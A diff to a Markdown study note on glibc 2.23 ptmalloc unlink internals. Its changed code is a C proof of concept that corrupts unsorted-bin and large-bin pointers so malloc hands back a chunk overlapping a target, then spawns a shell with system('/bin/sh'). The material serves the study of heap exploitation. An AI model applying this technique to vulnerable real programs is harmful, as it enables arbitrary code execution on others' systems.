@@ -1,6 +1,6 @@
 # ptmalloc unlink macro analysis
 
-#### source(glibc2.23):
+#### unlink source(glibc2.23):
 
 ```c
 /* Take a chunk off a bin list */
@@ -69,16 +69,13 @@ largebin：
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-struct {
-    char chunk_head[0x10];
-    char content[0x10];
-}fake;
 
 int main(void)
 {
     unsigned long *large_bin,*unsorted_bin;
-    unsigned long *fake_chunk;
     char *ptr;
+
+	void *target = malloc(0x68);
 
     unsorted_bin=malloc(0x418);
     malloc(0X18);
@@ -90,18 +87,18 @@ int main(void)
     unsorted_bin=malloc(0x418);
     free(unsorted_bin);
 
-    fake_chunk=((unsigned long)fake.content)-0x10;
+    unsigned long fake_chunk=(unsigned long)target-0x10;
     unsorted_bin[0]=0;
-    unsorted_bin[1]=(unsigned long)fake_chunk;
+    unsorted_bin[1]=fake_chunk;
 
     large_bin[0]=0;
-    large_bin[1]=(unsigned long)fake_chunk+8;
+    large_bin[1]=fake_chunk+8;
     large_bin[2]=0;
-    large_bin[3]=(unsigned long)fake_chunk-0x18-5;
+    large_bin[3]=fake_chunk-0x18-5;
 
     ptr=malloc(0x48);
-    strncpy(ptr, "/bin/sh", 0x48 - 1);
-    system(fake.content);
+    strcpy(ptr, "/bin/sh\x00");
+    system(target);
 }
 ```
 
